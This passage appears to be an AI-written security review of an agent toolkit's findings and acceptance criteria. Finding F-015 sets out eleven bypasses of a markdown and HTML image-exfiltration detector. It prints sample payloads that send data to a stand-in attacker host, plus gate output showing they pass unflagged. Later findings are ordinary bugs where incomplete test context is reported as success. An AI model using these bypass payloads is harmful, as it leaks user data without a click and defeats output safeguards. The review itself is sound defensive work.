    "impact": "A working zero-click exfiltration channel in the mandatory floor, on the SAME criterion (flow 233 AC5) F-001 was raised against, reached by two constructs F-001 did not cover. Eleven spellings reproduce against marked@17.0.1 — inline-destination wrap plain / angle-bracket / nested blockquote / CRLF / image-inside-link, and HTML start-tag wrap with a quoted value / an unquoted value / a wrapped attribute VALUE / nested blockquote / CRLF / `<iframe>` — and the renderer fetches attacker.invalid in every one while the detector reports zero findings. `keryx security check-output --target file` and `keryx security check-input --source tool-output` both return gate PASS / action allow with the URL unmasked; the allowlist cannot help because there is no finding to allow. The single-line forms of both constructs inside the same blockquote are flagged, so the difference is the wrap alone. This is the fourth round in which one member of this class was repaired and its siblings were left, which is the precise pattern the class_scope contract exists to stop — and the F-001 repair's own header comment claims the choke-point design closes 'both directions at once', which is true of the label and untrue of the class.",
    "suggested_fix": "Do not add a third and fourth marker grammar; reuse `skipBlockContainerPrefix`, as T90 and T91 already do. (a) For the inline destination, replace the regex's leading `\\s*` handling with a `skipDestinationLeadingWhitespace`-style scan from `descriptionEnd + 1` — that function (:824-843) already does exactly the right thing for the reference destination and is a pure function of (string, offset) — then match the destination from the returned offset, and strip repeated markers out of the captured URL span the way `stripBlockContainerMarkers` (:938) does for a label. Note the memoisation key at :1687 is `descriptionEnd`, which is unaffected. (b) For `readStartTag`, consume a repeated container prefix whenever one of its three whitespace loops crosses a line terminator, rather than treating the terminator as ordinary HTML space. Add RED/GREEN regressions beside the existing `T89:`/`T90:`/`T91:` tests in src/security/detect/exfil.test.ts for the inline-destination wrap and the start-tag wrap, on both the quoted and unquoted value forms. Whatever the repair, the class enumeration in F-001's class_scope should be re-run afterwards rather than assumed closed.",
    "evidence": "Renderer oracle (marked@17.0.1, offline from node_modules) plus detectExfil on identical bytes, /private/tmp/.../scratchpad/f001-class.ts and f015-spellings.ts:\n  BYPASS   | inline dest wrap, quote                | findings=0\n  BYPASS   | inline dest wrap, quote, angle         | findings=0\n  BYPASS   | inline dest wrap, nested quote         | findings=0\n  BYPASS   | inline dest wrap, CRLF quote           | findings=0\n  BYPASS   | inline dest wrap, image in link        | findings=0\n  BYPASS   | html tag wrap, quote                   | findings=0\n  BYPASS   | html tag wrap, quote, unquoted val     | findings=0\n  BYPASS   | html tag attr-value wrap, quote        | findings=0\n  BYPASS   | html tag wrap, nested quote            | findings=0\n  BYPASS   | html tag wrap, CRLF quote              | findings=0\n  BYPASS   | html iframe tag wrap, quote            | findings=0\n  flagged  | control: inline dest wraps, NO container   | findings=1\n  flagged  | control: html start tag wraps, NO container| findings=1\n  flagged  | control: single-line inline in quote       | findings=1\n  flagged  | control: single-line html img in quote     | findings=1\n  flagged  | T89/T90/T91 members (def-line, dest, label wrap, both sides) | findings=1\nRendered HTML for \"> ![alt](\\n> https://attacker.invalid/p.png?d=a)\\n\":\n  <blockquote> <p><img src=\"https://attacker.invalid/p.png?d=a\" alt=\"alt\"></p> </blockquote>\nRendered HTML for \"> <img\\n> src=\\\"https://attacker.invalid/p.png?d=a\\\">\\n\":\n  <blockquote> <p><img src=\"https://attacker.invalid/p.png?d=a\"></p> </blockquote>\nPublic boundaries, control vs bypass (the only difference is the wrap):\n  $ bun src/cli.ts security check-output --file control-inline.md --target file\n    gate: FAIL / action: block / findings: 1 / egress/egress.markdown-image-exfil (line 1)\n    Redacted: > ![alt]([REDACTED:url])\n  $ bun src/cli.ts security check-output --file bypass-inline.md --target file\n    gate: PASS / action: allow / findings: 0\n  $ bun src/cli.ts security check-output --file bypass-tag.md --target file\n    gate: PASS / action: allow / findings: 0\n  $ bun src/cli.ts security check-input --file bypass-inline.md --source tool-output\n    gate: PASS / action: allow / findings: 0\n  $ bun src/cli.ts security check-input --file bypass-tag.md --source tool-output\n    gate: PASS / action: allow / findings: 0",
    "class_scope": {
      "sites": [
        "src/security/detect/exfil.ts:1681-1709 — readInlineDestination, via INLINE_DESTINATION (:753). NOT FIXED.",
        "src/security/detect/exfil.ts:1968-2040 — readStartTag, via isHtmlSpace in its three whitespace loops. NOT FIXED.",
        "src/security/detect/exfil.ts:1279-1286 — readReferenceDefinitions definition-line opening. Same class, FIXED by T89.",
        "src/security/detect/exfil.ts:824-843 — skipDestinationLeadingWhitespace, reference destination. Same class, FIXED by T90.",
        "src/security/detect/exfil.ts:938-966 — stripBlockContainerMarkers via normaliseLabel, label text. Same class, FIXED by T91 (the F-001 repair).",
        "src/security/detect/exfil.ts:1472-1520 — readLabel's pre-filter, relaxed for terminator-crossing spans so the T91 repair can run. Same class, FIXED.",
        "src/security/detect/exfil.ts:640-648 and :1347-1352 — the index builder's terminator pass and the line-advance loop. NOT members: neither reads a construct across a terminator."
      ],
      "enumeration_method": "Identical to F-001's, and this finding IS the product of running it. See F-001's class_scope enumeration_method for the three searches (`function (read|skip|normalise|scan|parse)`, `LINE_TERMINATORS`, `INLINE_DESTINATION =|REFERENCE_DESTINATION =`, all through `keryx ctx rg` over src/security/detect/exfil.ts), the hand classification of all nine reader functions, and the marked@17.0.1 oracle that falsified it. The two unfixed sites are the two members that cross a terminator WITHOUT consulting LINE_TERMINATORS — which is why a search for that Set alone, the obvious enumeration, misses exactly them."
    },
    "confidence": "high",
    "disposition": {
      "state": "acted-on",
      "evidence": "Closed by flow 233 T93, which fixed the class rather than this member: five readers carried the shape, the inline-destination reader now calls the existing helper, and the four HTML readers are covered by re-running the pass over the renderer's own view. Two guards were added, both proved by mutation."
    }
  },
  {
    "id": "F-016",
    "reviewer": "managed-round-2026-09-07",
    "severity": "major",
    "blocking_merge": true,
    "file": "src/commands/test.ts",
    "line": 282,
    "symbol": "runExplain",
    "problem": "FOUND WHILE ENUMERATING F-003's CLASS. F-003 was repaired on `keryx test related`, the agent/MCP `test_related` boundary and its renderer. Two further members of \"callers that answer a testing question without carrying the context status\" were not. `runExplain` (`keryx test explain`, src/commands/test.ts:282-311) calls `findRelatedTests`, which computes a TestingContext internally and discards it, then prints `related tests: 0`. `runSuggest` (`keryx test suggest`, :65-121) does compute the context at :79 and holds it, but the prompt it sends the model (:111-119) carries only `Frameworks:` and `Existing related tests: none` — the status it already has in hand never reaches the answer.",
    "impact": "Flow 234 AC2 says an inability to refresh must surface as `incomplete` rather than `no-tests`. On the identical tree and the identical question, `keryx test related` now says `context: incomplete` and `keryx test explain` says `related tests: 0` with exit 0 and no signal at all — the failure-as-empty-success shape the criterion forbids, still reachable on a documented read-only surface an agent uses. `test suggest` is worse in kind if not in reach, because the incompleteness is discarded on its way into a model prompt, so the model asserts a test plan premised on a tree nobody could read.",
    "suggested_fix": "src/commands/test.ts:282-311 — replace `findRelatedTests(process.cwd(), target)` with the `computeTestingContext` + `relatedTestsInContext` pair `runRelated` now uses at :262-263 (this also drops a duplicate tree walk), and print `context: <status>` with the reasons above the `related tests:` line, exactly as `runRelated` does at :266-271. src/commands/test.ts:111-119 — add a line to the prompt when `context.status === \"incomplete\"`, naming the unreadable paths, so the model is told its input is partial rather than told there are no tests. Add a regression per surface; the existing coverage pins `test related` only.",
    "evidence": "Fixture /private/tmp/.../scratchpad/fx-lock2: `chmod 000 locked/`, target `src/a.ts` readable, so both surfaces face one tree and one question.\n  $ bun -e '... computeTestingContext(cwd)'\n    status: incomplete | reasons: [\"locked: EACCES: permission denied, scandir '.../fx-lock2/locked'\"]\n  $ bun src/cli.ts test related src/a.ts\n    # related tests: src/a.ts\n    context: incomplete\n      - locked: EACCES: permission denied, scandir '.../fx-lock2/locked'\n    - none\n  $ bun src/cli.ts test explain src/a.ts\n    # testing explain: src/a.ts\n    frameworks: none\n    related tests: 0\n    ## Latest Failures\n    - none\n    EXIT=0\nThe repaired boundary, driven on the same shape, is correct:\n  $ bun -e '... createMetaprojectAdapter(cwd).testRelated({file:\"locked/secret.ts\"}) ; formatTestRelated(r)'\n    structured: {\"file\":\"locked/secret.ts\",\"tests\":[],\"context\":{\"status\":\"incomplete\",\"incompleteReasons\":[\"locked: EACCES...\"]}}\n    renderer: \"INCOMPLETE: the testing context could not be fully refreshed — this answer may be missing tests: ...\"\n`test suggest` I did NOT drive end to end: it calls a model provider. Its classification is a code read of :79 and :111-119 only, and is recorded at that strength.",
    "class_scope": {
      "sites": [
        "src/commands/test.ts:282-311 — runExplain. NOT FIXED, driven.",
        "src/commands/test.ts:65-121 — runSuggest's model prompt. NOT FIXED, code read only.",
        "src/commands/test.ts:250-280 — runRelated. Same class, FIXED (F-003).",
        "src/harness/tool/metaproject-adapter.ts:533-555 — testRelated. Same class, FIXED (F-003).",
        "src/harness/tool/metaproject-operations.ts:288-305 — formatTestRelated. Same class, FIXED (F-003).",
        "src/harness/tool/metaproject-operations.ts:709-730 — the `test_related` descriptor. Forwards to the renderer; no answer of its own.",
        "src/commands/test.ts:143-183 — runRun / --strict. ALREADY CORRECT (T21).",
        "src/commands/test.ts:123-141 — runAnalyze. ALREADY CORRECT.",
        "src/commands/test.ts:217-248 — runReport. ALREADY CORRECT.",
        "src/commands/test.ts:185-195 — runStatus. Carries the shape via the report rather than the context; raised separately as F-017.",
        "src/commands/test.ts:197-215 — runContext. Dumps the context object without its status field; enumerated, not raised."
      ],
      "enumeration_method": "Identical to F-003's; see that class_scope for the full method. In short: `keryx ctx rg 'findRelatedTests|relatedTestsInContext|testRelated|test_related' --glob 'src/**'` for the helper callers, widened by `keryx ctx rg '^async function run|^function run' --glob 'src/commands/test.ts'` because the class is defined by the question answered rather than the helper called — all nine subcommands were then read and classified — and falsified by driving each surface over one fixture (fx-lock2) so the comparison is between commands, not between fixtures."
    },
    "confidence": "high",
    "disposition": {
      "state": "acted-on",
      "evidence": "Closed by flow 234 T27 for test explain and test suggest, and by the orchestrator for test context and coverage-map build, which T27's own enumeration named and left. Both orchestrator fixes are pinned by tests proved red by mutating the exact inserted lines."
    }
  },
  {
    "id": "F-017",
    "reviewer": "managed-round-2026-09-07",
    "severity": "minor",
    "file": "src/commands/test.ts",
    "line": 185,
    "symbol": "runStatus",
    "problem": "FOUND WHILE ENUMERATING F-008's CLASS. `keryx test status` reads the persisted testing report and prints `latest status: ${report.status}`. It never reads `report.context`, so a report that explicitly records `context.status: \"incomplete\"` — the tree could not be fully walked — is summarised as `latest status: pass`. The sibling surface `keryx test report latest`, reading the same file, prints `context: incomplete` and the reasons.",
    "impact": "Smaller reach than F-003 and F-008 because `test status` is a summary rather than a coverage claim, and the word `pass` is copied faithfully from the report's own `status` field. It is still a read-only surface an agent consults to decide whether the tree is healthy, answering from a report that says it is not fully known, with no way for the reader to tell. Listed as minor because nothing gates on it.",
    "suggested_fix": "src/commands/test.ts:185-195 — print `context: ${report.context.status}` beneath `latest status`, and the reasons when incomplete, guarded with `report.context &&` so a report persisted before flow 234 T21 still renders (the same guard `runReport` already uses at :240).",
    "evidence": "Fixture /private/tmp/.../scratchpad/fx-rep — a hand-written .metaproject/data/testing/artifacts/latest.json with `\"status\":\"pass\"`, zero failures and `\"context\":{\"status\":\"incomplete\",\"incompleteReasons\":[\"locked: EACCES: permission denied\"]}`.\n  $ bun src/cli.ts test status\n    # testing status\n    latest run: 2026-09-07T10:00:00.000Z\n    latest status: pass\n  $ bun src/cli.ts test report latest\n    # Test Report: PASS\n    failures: 0\n    context: incomplete\n      - locked: EACCES: permission denied\nSame file, same run, one surface says so and the other does not.",
    "class_scope": {
      "sites": [
        "src/commands/test.ts:185-195 — runStatus. NOT FIXED.",
        "src/commands/test.ts:217-248 — runReport. ALREADY CORRECT.",
        "src/commands/test.ts:282-311 — runExplain, which also loads the report (:290) but reads only its failures; its defect is the related-tests one raised as F-016.",
        "src/health/sources/tests.ts:114-186 — parseTestingReport, the health importer of the same report. FIXED (F-008).",
        "src/testing/service.ts:1013 — the report's markdown renderer, the source of runReport's context line. ALREADY CORRECT."
      ],
      "enumeration_method": "`keryx ctx rg 'loadTestingReport|loadCompatibleTestingReport|report\\.context|\\.context\\?\\.status' --glob 'src/**'`, run now, with test files filtered from the routed raw log. That returns every reader of the persisted testing report: src/health/sources/tests.ts:3, src/commands/test.ts:187/:223/:290, src/testing/service.ts:322/:346/:1013. Each was read and classified on whether it renders `report.context` alongside its verdict. Verified by running all three CLI readers over one hand-written report (fx-rep) whose status is `pass` and whose context is `incomplete`."
    },
    "confidence": "high",
    "disposition": {
      "state": "acted-on",
      "evidence": "Closed by flow 234 T27: the status surface renders the same report's context status that the report surface already rendered."
    }
  },
  {
    "id": "F-018",
    "reviewer": "managed-round-2026-09-07",
    "severity": "minor",
    "file": "src/health/sources/sonarqube.ts",
    "line": 85,
    "problem": "FOUND WHILE ENUMERATING F-008's CLASS, and it is the second instance F-008's own note asked someone to confirm — confirmed, on a different adapter than the one that note guessed at. The sonarqube source reads `sonar-issues.json` raw from disk (:58-72) and its `JSON.parse` catch returns `[]` (:85-89). Unlike `eslint.ts` (validate at :117) and `dependency-audit.ts` (validate at :143), it declares no `validate()`, so `runAdapter` has nothing to mark the source failed and records it as available / completed / parsed with zero findings. (The tests.ts catch F-008 pointed at is, by contrast, unreachable: that adapter's `import()` re-serialises an already-parsed report, so its own JSON.parse cannot fail.)",
    "impact": "A corrupt or truncated sonar report is indistinguishable from a clean scan in the health artifact — the same coverage-versus-findings conflation as F-008, on the sibling importer. Minor rather than major because sonarqube is configured optional here (the stored gate artifact reads `OPTIONAL: sonarqube source skipped`), so it cannot by itself turn a FAIL into a PASS on this repository today. It becomes major the moment the source is made required, and the defect is in the adapter, not in the configuration.",
    "suggested_fix": "src/health/sources/sonarqube.ts — add a `validate(raw)` that attempts the same `JSON.parse` and returns `{ valid: false, error: \"Sonar JSON parse failed\" }`, copying eslint.ts:117-125 verbatim in shape. That is all `runAdapter` (src/health/run.ts:399-419) needs to record `status: configured-but-failed, parse: failed` instead of clean coverage. While there: `typescript.ts` needs no such guard (it parses diagnostic lines, not JSON) and `tests.ts`'s catch is dead code that could be deleted or turned into a thrown error so it can never quietly become reachable again.",
    "evidence": "Driven through the REAL production functions, /private/tmp/.../scratchpad/f008-sonar.ts: a temp project containing `sonar-issues.json` with the bytes `{ this is not valid JSON at all `, passed to `runAdapter(sonarqubeAdapter, ctx, { mode: \"import\", required: false }, stamp)` imported from src/health/run.ts:\n  source audit: {\"source\":\"sonarqube\",\"status\":\"available\",\"execution\":\"completed\",\"parse\":\"parsed\",\"findings\":0}\nAn unreadable report, recorded as a clean parse with no findings.\nContrasting adapters, by direct read: eslint.ts:117-125 and dependency-audit.ts:143 each declare `validate`, which src/health/run.ts:400 turns into `parseFailed` and :412 into `parse: \"failed\"`. sonarqube.ts and tests.ts declare none (`keryx ctx rg 'validate' --glob 'src/health/sources/*.ts'` returns exactly two hits).",
    "class_scope": {
      "sites": [
        "src/health/sources/sonarqube.ts:45/:58-72/:85-89 — NOT FIXED, driven.",
        "src/health/sources/tests.ts:114-186 — FIXED (F-008); its :116-120 JSON.parse catch is unreachable, argued from :45-64.",
        "src/health/sources/eslint.ts:30/:83-84/:117-125 — ALREADY CORRECT, has validate().",
        "src/health/sources/dependency-audit.ts:100/:34-36/:143 — ALREADY CORRECT, has validate().",
        "src/health/sources/typescript.ts:17 — NOT A MEMBER: parses tsc diagnostic lines, no JSON report to fail on.",
        "src/health/run.ts:399-434 — runAdapter, the layer that turns a missing validate() into `parse: \"parsed\"`. Where the class's blast radius is set."
      ],
      "enumeration_method": "The health source registry is a directory, so the member set is exhaustive by construction rather than by search: `ls src/health/sources/` gives exactly five adapters. `keryx ctx rg 'JSON.parse|catch' --glob 'src/health/sources/*.ts'` locates each parse-failure path and `keryx ctx rg 'validate' --glob 'src/health/sources/*.ts'` locates the guards — exactly two, eslint.ts:117 and dependency-audit.ts:143 — and pairing the two searches is what identifies sonarqube and tests as the unguarded pair. Reading src/health/run.ts:399-434 confirms `validate()` is the ONLY mechanism by which a parse failure becomes visible in the source audit. Falsified rather than assumed: the sonarqube adapter was then driven through the real runAdapter with a deliberately corrupt report."
    },
    "confidence": "high",
    "disposition": {
      "state": "acted-on",
      "evidence": "Closed by flow 234 T27: the sonarqube adapter declares validation following the two sibling adapters that already did, so a corrupt report records as failed rather than parsed with zero findings."
    }
  }
]
```

---

## Per-criterion record

### Flow 232 — phase 0

| Criterion | Driven? | Result |
|---|---|---|
| AC1 (routing writer preserves index + routing document) | not driven | not assessed |
| AC2 (split entrypoint resolution, recoverable pair publication) | not driven | not assessed |
| AC3 (real round/call budget, `maxToolCalls` independent) | **yes** | holds |
| AC4 (stress JSON resolver, containment port no unsafe default) | partly, via AC3's probe suite | holds |
| AC5 (scripts TypeScript check fails on an injected type error) | **yes** | holds |
| AC6 (immutable evidence, review findings resolved, delivery records scope) | partly | holds |

AC3, driven by re-running the phase's own committed probes against the current tree:

```
$ bun .metaproject/flows/232-.../artifacts/T21-terminal-reason-probe.ts
  "T21C_tool_call_budget_stop_reports_tool_call_budget_exhausted": {"finishReason":"tool-call-budget","terminalStateReasons":["tool_call_budget_exhausted"],"pass":true}
  "failedCases": [], "allPassed": true
$ bun .metaproject/flows/232-.../artifacts/T16-final-core-budget-probe.ts
  "C11_unattended_no_progress_terminal_reason": {"configuredMaxRounds":20,"configuredMaxToolCalls":50,"finishReason":"no-progress","pass":true}
  "failedCases": [], "allPassed": true
```

AC5:

```
$ bun .metaproject/flows/232-.../artifacts/T10-scripts-typecheck-probe.ts
  "P3_injected_error_in_stress_script_is_caught": {"target":"scripts/stress/keryx-shell-stress.ts","ts2322InTarget":1,"pass":true}
  "P4_injected_error_in_containment_script_is_caught": {"target":"scripts/benchmark/run-containment.ts","ts2322InTarget":1,"pass":true}
  "failedCases": [], "allPassed": true
```

AC6's delivery clause: `artifacts/DELIVERY.md` exists and records the remaining AFC-16/21 scope.
I did not re-adjudicate the phase's own review reports.

**What I did not check for flow 232, and why:** AC1 and AC2 concern the routing-entrypoint writer
and `orient`/`catalog` resolution. I ran out of budget after the security and lifecycle work and
chose depth on the criteria the brief flagged as most likely to be wrong. They are not assessed
here; do not read this round as evidence for them.

### Flow 233 — phase 1

| Criterion | Driven? | Result |
|---|---|---|
| AC1 (contained reader) | not driven | not assessed |
| AC2 (structural redaction floor) | not driven | not assessed |
| AC3 (loopback-only HTTP) | not driven | not assessed |
| AC4 (truthful health gate) | not driven directly; see F-008 | not assessed |
| AC5 (structural masking, no spelling bypass) | **yes** | **fails — F-001** |
| AC6 (recursive security scan) | not driven | not assessed |
| AC7 (Shell parser) | not driven | not assessed |
| AC8 (evidence, no relabelled check) | partly | holds for phase 1's own logs |

AC5 was confirmed on 2026-09-07T07:15 on the strength of T89 and T90, with the note that the two
remaining unmeasured gaps (CRLF, tab before the marker) had been re-measured against `marked` and
that no bypass remained. I re-measured those two: both are correctly flagged, so that part of the
note holds. But a shape neither T89 nor T90 addressed does bypass — a definition or use LABEL that
wraps across a repeated blockquote marker — and it reaches two public boundaries with gate PASS and
zero findings. Full evidence in F-001.

I also ran a broader renderer-oracle sweep (about 85 payloads across inline images, reference
definitions, containers, entity spellings, HTML attribute forms, srcset boundaries and table/
emphasis/heading nesting). Apart from F-001, the only renderer-fetches-and-detector-does-not case
was `<iframe srcdoc>`, which the floor's own header enumerates as deliberately open. Everything
else was either flagged or correctly not fetched, including several over-approximations in the
safe direction. The floor is in good shape; F-001 is a specific hole, not a general weakness.

### Flow 234 — phase 2

| Criterion | Driven? | Result |
|---|---|---|
| AC1 (same lifecycle tolerance in wiki/memory; historical mode marked) | **yes** | **fails in historical mode — F-004**; holds in default mode |
| AC2 (testing snapshot; incomplete, not no-tests) | **yes** | **fails on read-only surfaces — F-003**; holds on `analyze`/`runTesting`/strict |
| AC3 (graph snapshot invalidation; unknown vs indexed-no-edges) | partly | holds on all three surfaces I checked |
| AC4 (type-only cycles) | not driven | not assessed |
| AC5 (symbols capability) | not driven | not assessed |
| AC6 (provenance through search→compression→handoff) | **yes** | **fails at the agent/MCP boundary and in `--json` — F-002, F-005, F-007** |
| AC7 (evidence; nothing relabelled; partial not sold as full) | **yes** | **fails — F-006, F-009** |

AC1: default retrieval agrees on all seven parity classes; the committed parity test drives the
real `searchEntries` and `wikiAsk` surfaces, which is the right design. Historical mode is the gap
— see F-004's matrix. The `historical` labelling itself is correct and visible in both the JSON
citations and the assembled answer text.

AC3: I traced the unknown-target distinction on all three surfaces named in the confirmation note
and it is genuinely present on each — the facade throws `UnknownGraphTargetError`
(src/gdgraph/service.ts:65-68), the CLI replicates the membership check against its
already-loaded graph and emits a structured `unknown-graph-target` object under `--json` with exit
1 (src/commands/gdgraph.ts:545-580), and the MCP path surfaces it as an `error` field that
`formatAffected` renders with `isError: true` (src/harness/tool/metaproject-operations.ts:81-83).
I did not drive the five invalidation triggers on git fixtures, so AC3 is "holds as far as I
checked", not "verified".

AC6: the fields do survive the CLI text form and the `flow init` "Related Memory" section, which
is a real improvement and the part T15 and T20 targeted. They do not survive the boundary the
criterion is actually about. Note that the `renderSearchMarkdown` dead-code residual is genuinely
closed — src/commands/memory.ts:233 calls it — but the shape moved rather than disappeared: there
are now three renderers, and the third, `formatMemory`, is the one a model reads and the one
nobody checked.

AC7: the acceptance run is real and its suite/health logs are substantive. The problems are that
two of the five evidence logs are empty (F-009) and that the criterion was confirmed while its own
review and acceptance tasks are open (F-006).

## What I got wrong, and corrected

My first provenance fixture wrote `Source:`, `Author:` and `Confirmed-By:` as top-level header
lines. `keryx memory search` reported `provenance: unknown | author: unknown | confirmedBy:
unknown` for an entry that plainly declared all three, which looked like a serious defect. It is
not. `src/memory/store.ts:54-66` reads `Source`/`Link`/`Author`/`Confirmed-By` as bullets inside a
`## Provenance` section, while `Version` and `Caveat` are top-level fields — a documented
convention, stated in that file's own comment. I rebuilt the fixture correctly and the fields
parsed. I record this because the wrong version of that observation would have been a fabricated
finding, and because the same mistake is easy for the next reviewer to make.

## Verdicts

- **Flow 232 (phase 0): HOLDS** — no criterion fails on the evidence I gathered. AC1 and AC2 were
  not driven and are not assessed; this verdict covers AC3, AC4, AC5 and AC6 only.
- **Flow 233 (phase 1): DOES NOT HOLD — AC5.** A working bypass of the mandatory auto-fetch floor
  is reproduced on two public boundaries with gate PASS and zero findings (F-001). By the phase's
  own recorded rule, a blocker reproduced on a public boundary is the one exception that must
  become a task rather than a residual.
- **Flow 234 (phase 2): DOES NOT HOLD — AC1, AC2, AC6, AC7.** AC1 fails in historical mode
  (F-004), AC2 on every read-only surface (F-003), AC6 at the agent and MCP tool boundary and in
  `--json` (F-002, F-005, with a committed test pinning it, F-007), AC7 on its own evidence and
  bookkeeping (F-006, F-009).

## Routing audit

`graph_used: no` — not-relevant. Every question here was behavioural and was settled by building a
fixture and driving a real command or port; the graph's own provenance is one of the files the
concurrent session touched, and a snapshot answer would have been weaker than the run.
`wiki_used: no` — not-relevant. The normative sources are the three frozen acceptance-criteria
files and `docs/requirements/keryx-agent-first-core/`, all read directly.
`ctx_used: yes` — all code search through `keryx ctx rg`, all long command output through
`keryx ctx run` / `keryx ctx read`.
`raw_rg_used: no`.
